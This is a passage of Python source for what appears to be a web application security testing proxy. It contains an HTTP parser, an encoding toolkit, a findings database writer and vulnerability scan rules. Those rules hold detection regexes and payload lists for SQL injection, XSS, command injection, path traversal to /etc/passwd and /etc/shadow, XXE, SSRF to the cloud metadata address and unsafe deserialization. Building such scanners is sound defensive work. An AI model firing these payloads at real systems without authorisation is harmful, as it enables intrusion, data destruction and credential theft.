                    'subject': dict(cert.subject),#self.name_to_dict(cert.subject), #dict(cert.subject)
                    'issuer': dict(cert.issuer),#self.name_to_dict(cert.issuer), #dict(cert.issuer)
                    'serial_number': str(cert.serial_number),
                    'not_valid_before': cert.not_valid_before.isoformat(),
                    'not_valid_after': cert.not_valid_after.isoformat(),
                    'signature_algorithm': cert.signature_algorithm_oid._name,
                    'version': cert.version.value,
                    'extensions': [ext.oid._name for ext in cert.extensions]
                }
            else:
                return {}
        except Exception as e:
            logger.error(f"Failed to get certificate info: {e}")
            return {}

    def name_to_dict(self,name: x509.Name) -> Dict[str, str]:
        return {
            attr.oid._name: attr.value
            for attr in name
        }


ca = CertificateAuthority()


# =================================================================
# REQUEST/RESPONSE PARSER
# =================================================================

class HTTPParser:
    """Advanced HTTP request/response parser"""

    @staticmethod
    def parse_request(raw: bytes) -> Dict:
        """Parse HTTP request with advanced features"""
        try:
            # Split headers and body
            header_end = raw.find(b'\r\n\r\n')
            if header_end == -1:
                return None

            headers_raw = raw[:header_end]
            body = raw[header_end + 4:]

            # Parse request line
            header_lines = headers_raw.split(b'\r\n')
            if not header_lines:
                return None

            request_line = header_lines[0].decode('latin-1')
            parts = request_line.split()

            if len(parts) < 3:
                return None

            method, full_path, version = parts[0], parts[1], parts[2]

            # Parse URL components
            parsed_url = urllib.parse.urlparse(full_path)
            path = parsed_url.path
            query = parsed_url.query
            fragment = parsed_url.fragment

            # Parse headers
            headers = []
            cookies = []
            auth_header = None
            content_type = None
            content_length = 0
            host = None
            user_agent = None
            referer = None

            for line in header_lines[1:]:
                if b': ' not in line:
                    continue

                key, value = line.split(b': ', 1)
                key_str = key.decode('latin-1')
                value_str = value.decode('latin-1')

                headers.append((key_str, value_str))

                # Extract important headers
                if key_str.lower() == 'host':
                    host = value_str
                elif key_str.lower() == 'user-agent':
                    user_agent = value_str
                elif key_str.lower() == 'referer':
                    referer = value_str
                elif key_str.lower() == 'content-type':
                    content_type = value_str
                elif key_str.lower() == 'content-length':
                    try:
                        content_length = int(value_str)
                    except:
                        pass
                elif key_str.lower() == 'cookie':
                    cookies.append(value_str)
                elif key_str.lower() == 'authorization':
                    auth_header = value_str

            # Parse cookies
            cookie_dict = {}
            for cookie in cookies:
                for pair in cookie.split(';'):
                    if '=' in pair:
                        k, v = pair.strip().split('=', 1)
                        cookie_dict[k] = v

            # Parse parameters
            params = {}
            if query:
                params.update(urllib.parse.parse_qs(query))

            # Parse POST parameters
            post_params = {}
            if method.upper() in ['POST', 'PUT', 'PATCH'] and body:
                if content_type:
                    if 'application/x-www-form-urlencoded' in content_type:
                        try:
                            post_params.update(urllib.parse.parse_qs(body.decode('latin-1')))
                        except:
                            pass
                    elif 'application/json' in content_type:
                        try:
                            json_data = json.loads(body.decode('utf-8'))
                            HTTPParser._flatten_json(json_data, '', post_params)
                        except:
                            pass
                    elif 'multipart/form-data' in content_type:
                        post_params = HTTPParser._parse_multipart(body, content_type)

            # Combine all parameters
            all_params = {**params, **post_params}

            # Calculate hash
            request_hash = hashlib.sha256(raw).hexdigest()

            return {
                'method': method,
                'full_path': full_path,
                'path': path,
                'query': query,
                'fragment': fragment,
                'headers': headers,
                'body': body,
                'version': version,
                'host': host,
                'user_agent': user_agent,
                'referer': referer,
                'content_type': content_type,
                'content_length': content_length,
                'cookies': cookie_dict,
                'authorization': auth_header,
                'parameters': all_params,
                'raw': raw,
                'hash': request_hash,
                'timestamp': datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to parse request: {e}")
            return None

    @staticmethod
    def parse_response(raw: bytes) -> Dict:
        """Parse HTTP response"""
        try:
            # Split headers and body
            header_end = raw.find(b'\r\n\r\n')
            if header_end == -1:
                return None

            headers_raw = raw[:header_end]
            body = raw[header_end + 4:]

            # Parse status line
            header_lines = headers_raw.split(b'\r\n')
            if not header_lines:
                return None

            status_line = header_lines[0].decode('latin-1')
            parts = status_line.split(' ', 2)

            if len(parts) < 3:
                return None

            version, status_code, status_text = parts[0], int(parts[1]), parts[2]

            # Parse headers
            headers = []
            cookies = []
            content_type = None
            content_length = 0
            server = None
            set_cookie = []

            for line in header_lines[1:]:
                if b': ' not in line:
                    continue

                key, value = line.split(b': ', 1)
                key_str = key.decode('latin-1')
                value_str = value.decode('latin-1')

                headers.append((key_str, value_str))

                # Extract important headers
                if key_str.lower() == 'content-type':
                    content_type = value_str
                elif key_str.lower() == 'content-length':
                    try:
                        content_length = int(value_str)
                    except:
                        pass
                elif key_str.lower() == 'server':
                    server = value_str
                elif key_str.lower() == 'set-cookie':
                    set_cookie.append(value_str)

            # Parse response body based on content type
            parsed_body = body
            if content_type:
                if 'gzip' in content_type:
                    try:
                        parsed_body = gzip.decompress(body)
                    except:
                        pass
                elif 'deflate' in content_type:
                    try:
                        parsed_body = zlib.decompress(body)
                    except:
                        pass
                elif 'br' in content_type:
                    try:
                        parsed_body = brotli.decompress(body)
                    except:
                        pass

            # Calculate hash
            response_hash = hashlib.sha256(raw).hexdigest()

            return {
                'version': version,
                'status_code': status_code,
                'status_text': status_text,
                'headers': headers,
                'body': body,
                'parsed_body': parsed_body,
                'content_type': content_type,
                'content_length': content_length,
                'server': server,
                'set_cookie': set_cookie,
                'raw': raw,
                'hash': response_hash,
                'timestamp': datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Failed to parse response: {e}")
            return None

    @staticmethod
    def _flatten_json(data, prefix, result):
        """Flatten JSON structure"""
        if isinstance(data, dict):
            for key, value in data.items():
                new_prefix = f"{prefix}.{key}" if prefix else key
                HTTPParser._flatten_json(value, new_prefix, result)
        elif isinstance(data, list):
            for i, value in enumerate(data):
                new_prefix = f"{prefix}[{i}]"
                HTTPParser._flatten_json(value, new_prefix, result)
        else:
            result[prefix] = str(data)

    @staticmethod
    def _parse_multipart(body: bytes, content_type: str) -> Dict:
        """Parse multipart form data"""
        params = {}

        try:
            # Extract boundary
            boundary_match = re.search(r'boundary=(.+)', content_type)
            if not boundary_match:
                return params

            boundary = boundary_match.group(1).encode()

            # Split parts
            parts = body.split(b'--' + boundary)

            for part in parts[1:-1]:  # Skip first and last
                if b'\r\n\r\n' not in part:
                    continue

                header_part, value_part = part.split(b'\r\n\r\n', 1)
                headers = header_part.decode('latin-1').split('\r\n')

                name = None
                filename = None

                for header in headers:
                    if header.startswith('Content-Disposition:'):
                        matches = re.findall(r'name="([^"]+)"', header)
                        if matches:
                            name = matches[0]

                        matches = re.findall(r'filename="([^"]+)"', header)
                        if matches:
                            filename = matches[0]

                if name:
                    if filename:
                        params[f"{name}_filename"] = filename
                        params[f"{name}_content"] = value_part.rstrip(b'\r\n')
                    else:
                        params[name] = value_part.rstrip(b'\r\n').decode('latin-1')

        except Exception as e:
            logger.error(f"Failed to parse multipart: {e}")

        return params

    @staticmethod
    def build_request(parsed: Dict) -> bytes:
        """Build HTTP request from parsed components"""
        try:
            # Build request line
            request_line = f"{parsed['method']} {parsed['full_path']} {parsed['version']}"

            # Build headers
            headers = []
            for key, value in parsed.get('headers', []):
                headers.append(f"{key}: {value}")

            # Add content-length if body exists
            if parsed.get('body'):
                content_length = len(parsed['body'])
                headers.append(f"Content-Length: {content_length}")

            # Combine
            request_build = f"{request_line}\r\n" + "\r\n".join(headers) + "\r\n\r\n"

            # Add body
            if parsed.get('body'):
                if isinstance(parsed['body'], str):
                    request_build += parsed['body']
                else:
                    request_bui = request_build.encode() + parsed['body']
                    return request_bui

            return request_build.encode()

        except Exception as e:
            logger.error(f"Failed to build request: {e}")
            return b""

    @staticmethod
    def build_response(parsed: Dict) -> bytes:
        """Build HTTP response from parsed components"""
        try:
            # Build status line
            status_line = f"{parsed['version']} {parsed['status_code']} {parsed['status_text']}"

            # Build headers
            headers = []
            for key, value in parsed.get('headers', []):
                headers.append(f"{key}: {value}")

            # Combine
            response = f"{status_line}\r\n" + "\r\n".join(headers) + "\r\n\r\n"

            # Add body
            if parsed.get('body'):
                if isinstance(parsed['body'], str):
                    response += parsed['body']
                else:
                    response = response.encode() + parsed['body']
                    return response

            return response.encode()

        except Exception as e:
            logger.error(f"Failed to build response: {e}")
            return b""


# =================================================================
# DATA PROCESSOR
# =================================================================

class DataProcessor:
    """Advanced data processing and transformation engine"""

    ENCODINGS = [
        'utf-8', 'latin-1', 'ascii', 'utf-16', 'utf-32',
        'iso-8859-1', 'windows-1252', 'cp437', 'cp850'
    ]

    HASH_ALGORITHMS = [
        'md5', 'sha1', 'sha256', 'sha512', 'sha3_256', 'sha3_512',
        'blake2b', 'blake2s', 'whirlpool'
    ]

    @staticmethod
    def detect_encoding(data: bytes) -> str:
        """Detect encoding of bytes"""
        try:
            import chardet
            result = chardet.detect(data)
            return result['encoding'] or 'utf-8'
        except:
            # Try common encodings
            for encoding in DataProcessor.ENCODINGS:
                try:
                    data.decode(encoding)
                    return encoding
                except:
                    continue
            return 'latin-1'

    @staticmethod
    def encode_base64(data: Union[str, bytes]) -> str:
        """Base64 encode"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return base64.b64encode(data).decode('ascii')

    @staticmethod
    def decode_base64(data: str) -> str:
        """Base64 decode"""
        try:
            return base64.b64decode(data).decode('utf-8')
        except:
            return base64.b64decode(data).decode('latin-1')

    @staticmethod
    def encode_base64_url(data: Union[str, bytes]) -> str:
        """Base64 URL encode"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return base64.urlsafe_b64encode(data).decode('ascii').rstrip('=')

    @staticmethod
    def decode_base64_url(data: str) -> str:
        """Base64 URL decode"""
        paddings = 4 - (len(data) % 4)
        data = data + ('=' * paddings)
        return base64.urlsafe_b64decode(data).decode('utf-8')

    @staticmethod
    def url_encode(data: str) -> str:
        """URL encode"""
        return urllib.parse.quote(data, safe='')

    @staticmethod
    def url_decode(data: str) -> str:
        """URL decode"""
        return urllib.parse.unquote(data)

    @staticmethod
    def html_encode(data: str) -> str:
        """HTML encode"""
        return html.escape(data)

    @staticmethod
    def html_decode(data: str) -> str:
        """HTML decode"""
        return html.unescape(data)

    @staticmethod
    def hex_encode(data: Union[str, bytes]) -> str:
        """Hex encode"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        return data.hex()

    @staticmethod
    def hex_decode(data: str) -> str:
        """Hex decode"""
        return bytes.fromhex(data).decode('utf-8')

    @staticmethod
    def rot13(data: str) -> str:
        """ROT13 encode/decode"""
        result = []
        for char in data:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def rot_n(data: str, n: int) -> str:
        """ROT-N encode/decode"""
        result = []
        for char in data:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + n) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + n) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def xor(data: Union[str, bytes], key: Union[str, bytes]) -> bytes:
        """XOR encrypt/decrypt"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        if isinstance(key, str):
            key = key.encode('utf-8')

        result = bytearray()
        key_len = len(key)

        for i, byte in enumerate(data):
            result.append(byte ^ key[i % key_len])

        return bytes(result)

    @staticmethod
    def calculate_hash(data: Union[str, bytes], algorithm: str = 'sha256') -> str:
        """Calculate hash"""
        if isinstance(data, str):
            data = data.encode('utf-8')

        if algorithm == 'md5':
            return hashlib.md5(data).hexdigest()
        elif algorithm == 'sha1':
            return hashlib.sha1(data).hexdigest()
        elif algorithm == 'sha256':
            return hashlib.sha256(data).hexdigest()
        elif algorithm == 'sha512':
            return hashlib.sha512(data).hexdigest()
        elif algorithm == 'sha3_256':
            return hashlib.sha3_256(data).hexdigest()
        elif algorithm == 'sha3_512':
            return hashlib.sha3_512(data).hexdigest()
        elif algorithm == 'blake2b':
            return hashlib.blake2b(data).hexdigest()
        elif algorithm == 'blake2s':
            return hashlib.blake2s(data).hexdigest()
        else:
            raise ValueError(f"Unknown algorithm: {algorithm}")

    @staticmethod
    def hmac_hash(data: Union[str, bytes], key: Union[str, bytes], algorithm: str = 'sha256') -> str:
        """Calculate HMAC"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        if isinstance(key, str):
            key = key.encode('utf-8')

        if algorithm == 'md5':
            return hmac.new(key, data, hashlib.md5).hexdigest()
        elif algorithm == 'sha1':
            return hmac.new(key, data, hashlib.sha1).hexdigest()
        elif algorithm == 'sha256':
            return hmac.new(key, data, hashlib.sha256).hexdigest()
        elif algorithm == 'sha512':
            return hmac.new(key, data, hashlib.sha512).hexdigest()
        else:
            raise ValueError(f"Unknown algorithm: {algorithm}")

    @staticmethod
    def jwt_decode(token: str) -> Dict:
        """Decode JWT token"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {"error": "Invalid JWT format"}

            # Decode header
            header_json = base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4))
            header = json.loads(header_json)

            # Decode payload
            payload_json = base64.urlsafe_b64decode(parts[1] + '=' * (4 - len(parts[1]) % 4))
            payload = json.loads(payload_json)

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "valid": True
            }
        except Exception as e:
            return {"error": str(e), "valid": False}

    @staticmethod
    def json_beautify(data: str) -> str:
        """Format JSON with indentation"""
        try:
            parsed = json.loads(data)
            return json.dumps(parsed, indent=2, sort_keys=True)
        except:
            return data

    @staticmethod
    def json_minify(data: str) -> str:
        """Minify JSON"""
        try:
            parsed = json.loads(data)
            return json.dumps(parsed, separators=(',', ':'))
        except:
            return data

    @staticmethod
    def xml_beautify(data: str) -> str:
        """Format XML with indentation"""
        try:
            dom = xml.dom.minidom.parseString(data)
            return dom.toprettyxml()
        except:
            return data

    @staticmethod
    def gzip_compress(data: Union[str, bytes]) -> str:
        """Gzip compress"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        compressed = gzip.compress(data)
        return base64.b64encode(compressed).decode('ascii')

    @staticmethod
    def gzip_decompress(data: str) -> str:
        """Gzip decompress"""
        compressed = base64.b64decode(data)
        return gzip.decompress(compressed).decode('utf-8')

    @staticmethod
    def deflate_compress(data: Union[str, bytes]) -> str:
        """Deflate compress"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        compressed = zlib.compress(data)
        return base64.b64encode(compressed).decode('ascii')

    @staticmethod
    def deflate_decompress(data: str) -> str:
        """Deflate decompress"""
        compressed = base64.b64decode(data)
        return zlib.decompress(compressed).decode('utf-8')

    @staticmethod
    def brotli_compress(data: Union[str, bytes]) -> str:
        """Brotli compress"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        compressed = brotli.compress(data)
        return base64.b64encode(compressed).decode('ascii')

    @staticmethod
    def brotli_decompress(data: str) -> str:
        """Brotli decompress"""
        compressed = base64.b64decode(data)
        return brotli.decompress(compressed).decode('utf-8')

    @staticmethod
    def lzma_compress(data: Union[str, bytes]) -> str:
        """LZMA compress"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        compressed = lzma.compress(data)
        return base64.b64encode(compressed).decode('ascii')

    @staticmethod
    def lzma_decompress(data: str) -> str:
        """LZMA decompress"""
        compressed = base64.b64decode(data)
        return lzma.decompress(compressed).decode('utf-8')

    @staticmethod
    def quoted_printable_encode(data: str) -> str:
        """Quoted-printable encode"""
        return quopri.encodestring(data.encode('utf-8')).decode('ascii')

    @staticmethod
    def quoted_printable_decode(data: str) -> str:
        """Quoted-printable decode"""
        return quopri.decodestring(data.encode('ascii')).decode('utf-8')

    @staticmethod
    def uu_encode(data: Union[str, bytes]) -> str:
        """UUencode"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        import uu
        import io
        bio = io.BytesIO()
        uu.encode(io.BytesIO(data), bio)
        return bio.getvalue().decode('ascii')

    @staticmethod
    def uu_decode(data: str) -> str:
        """UUdecode"""
        import uu
        import io
        bio = io.BytesIO(data.encode('ascii'))
        output = io.BytesIO()
        uu.decode(bio, output)
        return output.getvalue().decode('utf-8')

    @staticmethod
    def binary_to_text(binary: str) -> str:
        """Convert binary string to text"""
        # Remove spaces
        binary = binary.replace(' ', '')

        # Pad if needed
        if len(binary) % 8 != 0:
            binary = binary.ljust(len(binary) + (8 - len(binary) % 8), '0')

        # Convert
        result = []
        for i in range(0, len(binary), 8):
            byte = binary[i:i + 8]
            result.append(chr(int(byte, 2)))

        return ''.join(result)

    @staticmethod
    def text_to_binary(text: str) -> str:
        """Convert text to binary string"""
        result = []
        for char in text:
            result.append(format(ord(char), '08b'))
        return ' '.join(result)

    @staticmethod
    def morse_encode(text: str) -> str:
        """Encode text to Morse code"""
        morse_dict = {
            'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',
            'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',
            'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',
            'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
            'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--',
            'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
            '3': '...--', '4': '....-', '5': '.....', '6': '-....',
            '7': '--...', '8': '---..', '9': '----.', ' ': '/'
        }

        result = []
        for char in text.upper():
            if char in morse_dict:
                result.append(morse_dict[char])

        return ' '.join(result)

    @staticmethod
    def morse_decode(morse: str) -> str:
        """Decode Morse code to text"""
        morse_dict = {
            '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
            '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
            '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
            '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
            '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
            '--..': 'Z', '-----': '0', '.----': '1', '..---': '2',
            '...--': '3', '....-': '4', '.....': '5', '-....': '6',
            '--...': '7', '---..': '8', '----.': '9', '/': ' '
        }

        result = []
        for code in morse.split(' '):
            if code in morse_dict:
                result.append(morse_dict[code])

        return ''.join(result)

    @staticmethod
    def generate_password(length: int = 16, complexity: int = 3) -> str:
        """Generate secure password"""
        if complexity == 1:  # Lowercase only
            chars = string.ascii_lowercase
        elif complexity == 2:  # Lowercase + uppercase
            chars = string.ascii_letters
        elif complexity == 3:  # Letters + digits
            chars = string.ascii_letters + string.digits
        elif complexity == 4:  # Letters + digits + punctuation
            chars = string.ascii_letters + string.digits + string.punctuation
        else:  # Maximum complexity
            chars = string.ascii_letters + string.digits + string.punctuation

        return ''.join(secrets.choice(chars) for _ in range(length))

    @staticmethod
    def extract_emails(text: str) -> List[str]:
        """Extract email addresses from text"""
        pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        return re.findall(pattern, text)

    @staticmethod
    def extract_urls(text: str) -> List[str]:
        """Extract URLs from text"""
        pattern = r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[^\s]*'
        return re.findall(pattern, text)

    @staticmethod
    def extract_ips(text: str) -> List[str]:
        """Extract IP addresses from text"""
        pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        return re.findall(pattern, text)

    @staticmethod
    def extract_hashes(text: str) -> Dict[str, List[str]]:
        """Extract cryptographic hashes from text"""
        patterns = {
            'md5': r'[a-fA-F0-9]{32}',
            'sha1': r'[a-fA-F0-9]{40}',
            'sha256': r'[a-fA-F0-9]{64}',
            'sha512': r'[a-fA-F0-9]{128}'
        }

        result = {}
        for hash_type, pattern in patterns.items():
            matches = re.findall(pattern, text)
            if matches:
                result[hash_type] = matches

        return result


class DatabaseWriter:
    """Single-threaded database writer to avoid locks"""

    def __init__(self):
        self.queue = queue.Queue()
        self.running = True
        self.writer_thread = threading.Thread(target=self._writer_loop, daemon=True)
        self.writer_thread.start()

    def add_findings(self, scan_id: str, findings: List[Dict], project_id: str = 'master'):
        """Add findings to write queue"""
        self.queue.put({
            'scan_id': scan_id,
            'findings': findings,
            'project_id': project_id,
            'timestamp': datetime.now(timezone.utc).isoformat()
        })

    def _writer_loop(self):
        """Single writer thread to avoid database locks"""
        while self.running:
            try:
                # Get next item (wait up to 1 second)
                item = self.queue.get(timeout=1)

                # Write to database
                self._write_findings(
                    item['scan_id'],
                    item['findings'],
                    item['project_id']
                )

                self.queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Database writer error: {e}")

    def _write_findings(self, scan_id: str, findings: List[Dict], project_id: str):
        """Actually write findings to database"""
        if not findings:
            return

        try:
            conn = sqlite3.connect(Config.DB_FILE, timeout=30)
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA synchronous=NORMAL")

            cursor = conn.cursor()

            # Single transaction for all findings
            cursor.execute("BEGIN")

            for finding in findings:
                f = normalize_finding(
                    finding,
                    project_id=project_id,
                    scan_id=scan_id
                )

                cursor.execute("""
                    INSERT OR REPLACE INTO scanner_findings (
                        id, project_id, request_id, timestamp,
                        issue_type, severity, confidence,
                        url, host, path, parameter,
                        description, detail, remediation, evidence,
                        request, response,
                        cvss_score, cwe_id, owasp_category,
                        impact, likelihood, risk_level,
                        status, assigned_to, due_date, fix_date,
                        verified, false_positive,
                        notes, reference_links, metadata
                    )
                    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
                """, (
                    f['id'], f['project_id'], f['request_id'], f['timestamp'],
                    f['issue_type'], f['severity'], f['confidence'],
                    f['url'], f['host'], f['path'], f['parameter'],
                    f['description'], f['detail'], f['remediation'], f['evidence'],
                    f['request'], f['response'],
                    f['cvss_score'], f['cwe_id'], f['owasp_category'],
                    f['impact'], f['likelihood'], f['risk_level'],
                    f['status'], f['assigned_to'], f['due_date'], f['fix_date'],
                    f['verified'], f['false_positive'],
                    f['notes'], f['reference_links'], f['metadata']
                ))

            cursor.execute("COMMIT")
            conn.close()

            logger.info(f"Writer saved {len(findings)} findings for scan {scan_id}")

        except Exception as e:
            logger.error(f"Writer failed for scan {scan_id}: {e}")

    def _calculate_cvss_score(self, severity: str) -> float:
        """Calculate CVSS score based on severity"""
        scores = {
            'Critical': 9.0,
            'High': 7.5,
            'Medium': 5.0,
            'Low': 3.0,
            'Info': 0.0
        }
        return scores.get(severity, 5.0)


# Global writer instance
db_writer = DatabaseWriter()

# =================================================================
# VULNERABILITY SCANNER
# =================================================================

class VulnerabilityScanner:
    """Advanced vulnerability scanner with multiple detection engines"""

    def __init__(self):
        self.scan_rules = self._load_scan_rules()
        self.signatures = self._load_signatures()
        self.active_scans = {}
        self.scan_lock = threading.Lock()
        self.findings_cache = {}  # Store findings in memory
        self.payloads = self._load_payloads()

        # CWE database
        self.cwe_db = self._load_cwe_db()
        self.db_writer = db_writer

        # OWASP Top 10 2021
        self.owasp_top_10 = {
            "A01:2021": "Broken Access Control",
            "A02:2021": "Cryptographic Failures",
            "A03:2021": "Injection",
            "A04:2021": "Insecure Design",
            "A05:2021": "Security Misconfiguration",
            "A06:2021": "Vulnerable and Outdated Components",
            "A07:2021": "Identification and Authentication Failures",
            "A08:2021": "Software and Data Integrity Failures",
            "A09:2021": "Security Logging and Monitoring Failures",
            "A10:2021": "Server-Side Request Forgery (SSRF)"
        }

    def _load_scan_rules(self) -> Dict:
        """Load scanning rules and patterns"""
        return {
            'SQL Injection': {
                'patterns': [
                    r"(?i)(union\s+.*select|select\s+.*from)",
                    r"(?i)(insert\s+into|update\s+.*set|delete\s+from)",
                    r"(?i)(drop\s+table|create\s+table|alter\s+table)",
                    r"(?i)(sleep\s*\(\s*\d+\s*\)|benchmark\s*\(|waitfor\s+delay)",
                    r"(?i)(or\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+)",
                    r"(?i)(--\s*$|#|/\*.*\*/)",
                    r"(?i)(exec\s*\(|sp_|xp_|@@version)",
                    r"(\%27|\')",
                ],
                'severity': 'High',
                'confidence': 'Medium',
                'cwe': 'CWE-89',
                'owasp': 'A03:2021',
                'remediation': 'Use parameterized queries or prepared statements.',
                'payloads': [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "'; DROP TABLE users--",
                    "' OR 1=1--",
                    "' OR 'a'='a",
                    "admin'--",
                    "' AND 1=0 UNION SELECT @@version--"
                ]
            },
            'Cross-site Scripting (XSS)': {
                'patterns': [
                    r"<script[^>]*>.*?</script>",
                    r"javascript:",
                    r"(onload|onerror|onclick|onmouseover|onfocus)\s*=",
                    r"alert\s*\(\s*['\"].*['\"]\s*\)",
                    r"<iframe[^>]*>",
                    r"<img[^>]*src\s*=\s*[^>]*onerror\s*=",
                    r"eval\s*\(|setTimeout\s*\(|setInterval\s*\(",
                    r"document\.(cookie|location|write)",
                ],
                'severity': 'Medium',
                'confidence': 'Medium',
                'cwe': 'CWE-79',
                'owasp': 'A03:2021',
                'remediation': 'Implement proper output encoding and input validation.',
                'payloads': [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "\"><script>alert(1)</script>",
                    "javascript:alert(1)",
                    "<svg onload=alert(1)>"
                ]
            },
            'Command Injection': {
                'patterns': [
                    r"(?i)(;|\||&|`|\\$\().*(ls|cat|id|whoami|pwd|echo)",
                    r"(?i)(system|exec|shell_exec|passthru|popen|proc_open)\s*\(",
                    r"(`|\$\(|\\n)",
                ],
                'severity': 'Critical',
                'confidence': 'High',
                'cwe': 'CWE-78',
                'owasp': 'A03:2021',
                'remediation': 'Validate and sanitize all user inputs.',
                'payloads': [
                    "; ls",
                    "| id",
                    "`whoami`",
                    "$(id)",
                    "; cat /etc/passwd"
                ]
            },
            'Path Traversal': {
                'patterns': [
                    r"\.\./|\.\.\\\\",
                    r"/etc/passwd|/etc/shadow|/etc/hosts",
                    r"c:\\windows\\system32\\",
                    r"(?i)(include|require|require_once|include_once).*[\"']\.\.[\"']",
                ],
                'severity': 'High',
                'confidence': 'High',
                'cwe': 'CWE-22',
                'owasp': 'A01:2021',
                'remediation': 'Implement proper file path validation.',
                'payloads': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "../../../../etc/shadow",
                    "/etc/passwd%00"
                ]
            },
            'XML External Entity (XXE)': {
                'patterns': [
                    r"<!ENTITY",
                    r"SYSTEM\s+[\"']",
                    r"DOCTYPE\s+\w+\s*\[",
                    r"<!DOCTYPE.*ENTITY",
                ],
                'severity': 'High',
                'confidence': 'Medium',
                'cwe': 'CWE-611',
                'owasp': 'A05:2021',
                'remediation': 'Disable external entity processing in XML parsers.',
                'payloads': [
                    "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
                ]
            },
            'Server-Side Request Forgery (SSRF)': {
                'patterns': [
                    r"url\s*=\s*[\"'](http|https|ftp|file|gopher)://",
                    r"(localhost|127\.0\.0\.1|192\.168|10\.|172\.(1[6-9]|2[0-9]|3[0-1]))",
                    r"((https?|ftp|file)://.*@.*)",
                ],
                'severity': 'High',
                'confidence': 'Medium',
                'cwe': 'CWE-918',
                'owasp': 'A10:2021',
                'remediation': 'Validate and sanitize URL inputs.',
                'payloads': [
                    "http://localhost:8080",
                    "file:///etc/passwd",
                    "http://169.254.169.254/latest/meta-data/"
                ]
            },
            'File Upload Vulnerabilities': {
                'patterns': [
                    r"(?i)\.(php|jsp|asp|aspx|pl|py|cgi|sh|exe|dll|bat|cmd)(\.|$)",
                    r"Content-Type\s*:\s*.*(php|jsp|asp)",
                    r"filename\s*=\s*[\"'].*\.(php|jsp|asp)",
                ],
                'severity': 'High',
                'confidence': 'Medium',
                'cwe': 'CWE-434',
                'owasp': 'A01:2021',
                'remediation': 'Restrict file types and scan uploaded files.',
                'payloads': [
                    "shell.php",
                    "test.jsp",
                    "malicious.asp"
                ]
            },
            'Insecure Deserialization': {
                'patterns': [
                    r"(?i)(serialize|unserialize|ObjectInputStream|readObject)",
                    r"(?i)(__destruct|__wakeup|__toString)",
                    r"(?i)(pickle|marshal|yaml\.load)",
                ],
                'severity': 'Critical',
                'confidence': 'Low',
                'cwe': 'CWE-502',
                'owasp': 'A08:2021',
                'remediation': 'Avoid deserializing untrusted data.',
                'payloads': [
                    'O:8:"stdClass":0:{}',
                    '{"__class__": "os.system", "__args__": ["ls"]}'
                ]
            },
            'CORS Misconfiguration': {
                'patterns': [
                    r"Access-Control-Allow-Origin\s*:\s*\*",
                    r"Access-Control-Allow-Credentials\s*:\s*true.*Origin\s*:\s*\*",
                ],
                'severity': 'Medium',
                'confidence': 'High',
                'cwe': 'CWE-942',
                'owasp': 'A07:2021',
                'remediation': 'Configure proper CORS headers.',
                'payloads': []
            },
            'Security Headers Missing': {
                'patterns': [],
                'severity': 'Low',
                'confidence': 'High',
                'cwe': 'CWE-693',
                'owasp': 'A05:2021',
                'remediation': 'Implement security headers.',
                'headers_to_check': [
                    'Content-Security-Policy',
                    'X-Frame-Options',
                    'X-Content-Type-Options',
                    'Strict-Transport-Security',
                    'Referrer-Policy',
                    'Permissions-Policy'
                ]
            },
            'Information Disclosure': {
                'patterns': [
                    r"(?i)(error|exception|stack\s+trace|at\s+.*\.java)",
                    r"(?i)(password|secret|key|token)\s*=\s*[\"'][^\"']*[\"']",
                    r"(?i)(api[_-]?key|access[_-]?token|auth[_-]?token)",
                ],
                'severity': 'Medium',
                'confidence': 'High',
                'cwe': 'CWE-200',
                'owasp': 'A01:2021',
                'remediation': 'Configure proper error handling.',
                'payloads': []
